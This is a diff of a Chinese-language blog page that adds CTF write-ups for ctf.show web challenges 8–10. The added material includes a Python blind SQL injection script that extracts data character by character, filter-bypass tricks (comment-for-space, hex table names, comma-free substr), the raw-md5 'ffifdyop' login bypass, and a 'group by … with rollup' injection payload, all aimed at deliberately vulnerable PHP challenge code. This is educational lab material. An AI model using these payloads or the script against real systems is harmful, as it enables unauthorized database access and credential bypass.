@@ -32,7 +32,7 @@
 <meta property="og:image" content="c:\Users\%E9%99%88\AppData\Roaming\Typora\typora-user-images\image-20230817105306721.png">
 <meta property="og:image" content="c:\Users\%E9%99%88\AppData\Roaming\Typora\typora-user-images\image-20230817105325864.png">
 <meta property="article:published_time" content="2023-08-17T02:27:07.000Z">
-<meta property="article:modified_time" content="2023-08-17T03:46:48.882Z">
+<meta property="article:modified_time" content="2023-08-17T07:40:02.738Z">
 <meta property="article:author" content="xuan">
 <meta property="article:tag" content="ctf解题">
 <meta name="twitter:card" content="summary">
@@ -145,7 +145,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web1"><span class="nav-number">1.</span> <span class="nav-text">web1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web2"><span class="nav-number">2.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web3"><span class="nav-number">3.</span> <span class="nav-text">web3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web4"><span class="nav-number">4.</span> <span class="nav-text">web4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web5"><span class="nav-number">5.</span> <span class="nav-text">web5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web6"><span class="nav-number">6.</span> <span class="nav-text">web6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web7"><span class="nav-number">7.</span> <span class="nav-text">web7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web8"><span class="nav-number">8.</span> <span class="nav-text">web8</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web1"><span class="nav-number">1.</span> <span class="nav-text">web1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web2"><span class="nav-number">2.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web3"><span class="nav-number">3.</span> <span class="nav-text">web3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web4"><span class="nav-number">4.</span> <span class="nav-text">web4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web5"><span class="nav-number">5.</span> <span class="nav-text">web5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web6"><span class="nav-number">6.</span> <span class="nav-text">web6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web7"><span class="nav-number">7.</span> <span class="nav-text">web7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web8"><span class="nav-number">8.</span> <span class="nav-text">web8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web9"><span class="nav-number">9.</span> <span class="nav-text">web9</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web10"><span class="nav-number">10.</span> <span class="nav-text">web10</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -234,7 +234,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2023-08-17 10:27:07 / 修改时间：11:46:48" itemprop="dateCreated datePublished" datetime="2023-08-17T10:27:07+08:00">2023-08-17</time>
+      <time title="创建时间：2023-08-17 10:27:07 / 修改时间：15:40:02" itemprop="dateCreated datePublished" datetime="2023-08-17T10:27:07+08:00">2023-08-17</time>
     </span>
 
   
@@ -251,14 +251,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>5.1k</span>
+      <span>9.7k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>9 分钟</span>
+      <span>18 分钟</span>
     </span>
 </div>
 
@@ -450,7 +450,59 @@ tap
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3</span><br></pre></td></tr></table></figure>
 
 <p>成功获取flag</p>
-<h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p>根据上题过滤空格的经验，这一题也是一样过滤了空格，并且and、和union select都过滤了，那么只能考虑运用其他方法来注入了<br>过滤空格：可以使用&#x2F;**&#x2F;和%a0绕过<br>过滤联合查询语句：可以使用盲注替代联合注入<br>过滤逗号,：可以使用特殊语法绕过, 比如:substr(database(),1,1) 可以用 substr(database() from 1 for 1)来代替<br>过滤and：可以使用or</p>
+<h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p>提示是sql注入，第一步先试下 ’ or 1&#x3D;1# 提示sql注入错误</p>
+<p>第二步试下&#x2F;**&#x2F;替代空格，还是错误</p>
+<p>第三步，去掉’单引号，成功，说明过滤了单引号<br> 测试：<code>?id=1/**/or/**/1=1#</code></p>
+<p>回显全部</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>无回显</p>
+<p>考虑盲注</p>
+<p>查看有多少字段<code>1/**/or/**/1=1/**/union/**/select/**/1,2,3#</code>，但是这里又提示sql错误，这里可能过滤了select和union关键字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">过滤空格：可以使用/**/和%a0绕过</span><br><span class="line">过滤联合查询语句：可以使用盲注替代联合注入</span><br><span class="line">过滤逗号,：可以使用特殊语法绕过, 比如:substr(database(),1,1) 可以用 substr(database() from 1 for 1)来代替</span><br><span class="line">过滤and：可以使用or</span><br><span class="line">过滤单引号：表名可以用十六进制来表示</span><br></pre></td></tr></table></figure>
+
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=&#x27;http://1a52462e-b3aa-4f50-8445-0792a199259e.chall.ctf.show/index.php&#x27;</span><br><span class="line">table=&quot;&quot;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">&#x27; and ascii(substr((select database()),1,1))=xx #</span><br><span class="line">这样的话写个脚本很容易跑出来了，过滤逗号之后可以变成这样</span><br><span class="line"></span><br><span class="line">&#x27; and ascii(substr((select database())from 1 for 1))=xx #</span><br><span class="line">这应该是substring函数的两种用法</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1,45):</span><br><span class="line">    print(i)</span><br><span class="line">    for j in range(31,128):</span><br><span class="line">        #爆表名  flag</span><br><span class="line">        #payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br><span class="line">        #爆字段名 flag</span><br><span class="line">        #payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br><span class="line">        #读取flag</span><br><span class="line">        payload = &quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;%(str(i), str(j))</span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + &#x27;?id=0/**/or/**/&#x27; + payload).text</span><br><span class="line"></span><br><span class="line">        if &#x27;I asked nothing&#x27; in ra:</span><br><span class="line">            table += chr(j)</span><br><span class="line">            print(table)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><p> 进去以后就是一个登录界面, 盲猜是个SQL注入漏洞,行不通<br> 就觉得该换个思路</p>
+<p>那就扫描下目录吧,dirsearch扫出了一个robots.txt</p>
+<p>我们访问根目录下的 robots.txt 文件</p>
+<pre><code>robots.txt是一个文本文件,同时也是一个协议,规定了爬虫访问的规则( 哪些文件可以爬取,哪些文件不可以爬取)
+</code></pre>
+<p> 从robots.txt文件的内容中可以发现, 作者给了提示, index.phps文件应该就是此关卡的源码文件</p>
+<p> 然后就是访问这个地址给你一个下载链接我们直接打开得到</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $flag=&quot;&quot;;</span><br><span class="line">		$password=$_POST[&#x27;password&#x27;];</span><br><span class="line">		if(strlen($password)&gt;10)&#123;</span><br><span class="line">			die(&quot;password error&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		$sql=&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;</span><br><span class="line">		$result=mysqli_query($con,$sql);</span><br><span class="line">			if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">					while($row=mysqli_fetch_assoc($result))&#123;</span><br><span class="line">						 echo &quot;登陆成功&lt;br&gt;&quot;;</span><br><span class="line">						 echo $flag;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 从源码中可以发现, SQL中使用了md5()函数加密, 我们可以利用MD5加密漏洞来绕过</p>
+<p>考验你的代码审计，如果php有没怎么学的建议恶补一下，学一下语法和php的数据库连接</p>
+<pre><code>$sql=&quot;select * from user where username =&#39;admin&#39; and password =&#39;&quot;.md5($password,true).&quot;&#39;&quot;;
+        $result=mysqli_query($con,$sql);
+            if(mysqli_num_rows($result)&gt;0)&#123;
+                while($row=mysqli_fetch_assoc($result))&#123;
+                         echo &quot;登陆成功&lt;br&gt;&quot;;
+                         echo $flag;
+</code></pre>
+<p>我们主要看这一块，那些mysqli什么的函数如果没用过直接上菜鸟搜函数的作用，下面的函数大概就是如果能成功访问到数据库获得那些行值就能执行while 那也就是说 r e s u l t 这 个 值 必 须 是 正 确 的 ， 那 我 们 就 来 看 看 result这个值必须是正确的， 那我们就来看看 result这个值必须是正确的，那我们就来看看result</p>
+<pre><code>$result=mysqli_query($con,$sql);
+</code></pre>
+<p>和 s q l 是 有 关 系 的 也 就 是 sql 是有关系的 也就是 sql是有关系的也就是sql的查询语句要是正确的，那我们接下来看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>username这一部分原网页里面就已经帮我填写了 那我们重点来看password这一块<br>首先了解一下md5这个函数后面有个参数默认是false返回32位的16进制数，而这里是true<br>菜鸟教程上给出的解释是TRUE - 原始 16 字符二进制格式 大致就是把你这一堆MD5值又弄成字符串了<br>大家想想前面值为真了,那这边如果是 or xxxxx的话不就是恒真了嘛。那就想想有什么字符输进去最后会转成 带 or 的，然后这里我就开始进行强大的搜索引擎了 最后找到篇博客 里面就是这道题，然后大佬给出了两个值一个是<br>129581926211651571912466741651878684928<br>另一个是<br>ffifdyop<br>那这样下次这样的题目如果判断全是数字就用上面，如果判断是字符就用下面</p>
+<p>这边因为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
+
+<p>有限制长度</p>
+<p>所以在密码框中输入 ffifdyop, 即可登录成功, 获取flag</p>
+<h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><p>和web9一样。先查看一下源码，<br> 右键查看源代码<br> 进入style.css<br> 发现有index.phps<br> 在url处输入后，查看源码得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">		$flag=&quot;&quot;;</span><br><span class="line">        function replaceSpecialChar($strParam)&#123;</span><br><span class="line">             $regex = &quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;;</span><br><span class="line">             return preg_replace($regex,&quot;&quot;,$strParam);</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$con)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&#x27;Could not connect: &#x27; . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line">		if(strlen($username)!=strlen(replaceSpecialChar($username)))&#123;</span><br><span class="line">			die(&quot;sql inject error&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		if(strlen($password)!=strlen(replaceSpecialChar($password)))&#123;</span><br><span class="line">			die(&quot;sql inject error&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		$sql=&quot;select * from user where username = &#x27;$username&#x27;&quot;;</span><br><span class="line">		$result=mysqli_query($con,$sql);</span><br><span class="line">			if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">					while($row=mysqli_fetch_assoc($result))&#123;</span><br><span class="line">						if($password==$row[&#x27;password&#x27;])&#123;</span><br><span class="line">							echo &quot;登陆成功&lt;br&gt;&quot;;</span><br><span class="line">							echo $flag;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现被过滤了这些东西select|from|where|join|sleep|and|\s|union|,<br>又被这个避免了双写绕过if(strlen($password)!&#x3D;strlen(replaceSpecialChar($password))){ die(“sql inject error”);}</p>
+<p>定义了过滤函数，对username和password进行过滤，然后判断输入的password是否对应根据我们输入的username从数据库中查到的密码</p>
+<p>这时候，我们要用到group by和roll with<br>group by（将结果集中的数据行根据选择列的值进行逻辑分组）：<br>在使用group by以后会按照password中的值进行排列：<br>with rollup （group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计）<br>此时我们发现，多出一行NULL，并且count（*）为统计和。<br>加入with rollup后 password有一行为NULL。<br>payload在用户名框中进行输入，密码框不输入，使其为空，满足 p a s s w o r d &#x3D; &#x3D; password&#x3D;&#x3D; password&#x3D;&#x3D;row[‘password’]</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -520,13 +572,13 @@ tap
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">101k</span>
+    <span title="站点总字数">106k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:04</span>
+    <span title="站点阅读时长">3:12</span>
   </span>
 </div>
 <div class="busuanzi-count">
